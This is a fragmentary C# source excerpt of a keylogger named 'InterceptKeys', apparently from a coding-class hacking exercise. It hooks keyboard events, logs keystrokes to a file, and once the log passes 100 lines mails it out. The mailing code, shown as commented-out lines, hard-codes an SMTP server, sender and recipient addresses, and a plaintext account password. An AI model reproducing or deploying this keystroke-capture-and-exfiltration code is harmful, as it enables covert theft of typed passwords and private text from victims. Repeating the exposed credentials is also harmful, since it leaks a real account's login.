...
class InterceptKeys
{
    ...
    public static void Main()
    {
		...
		//Send mail start
           ...
           //SmtpClient SmtpServer = new SmtpClient("serwer1369095.home.pl");
           //mail.From = new MailAddress("hacking@giganciprogramowania.edu.pl");
           //mail.To.Add("natiktok12345@gmail.com");
           //mail.Subject = "KYL na urządzeniu " + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + " zaczą działać!";
           //mail.Body = DateTime.Now.ToString("yyyy-MM-dd-HH:mm:ss") + "\n\n" + System.AppDomain.CurrentDomain.FriendlyName;
           //SmtpServer.Port = 587;
           //SmtpServer.Credentials = new System.Net.NetworkCredential("hacking@giganciprogramowania.edu.pl", "Giganci2022#");
        ...
        int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            ...
            if (File.ReadAllLines(pathToLog).Length > 100)
            {
                  ...
                  //mail.From = new MailAddress("hacking@giganciprogramowania.edu.pl");
                  //mail.To.Add("natiktok12345@gmail.com");
                  //mail.Subject = "log from KYL on" + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
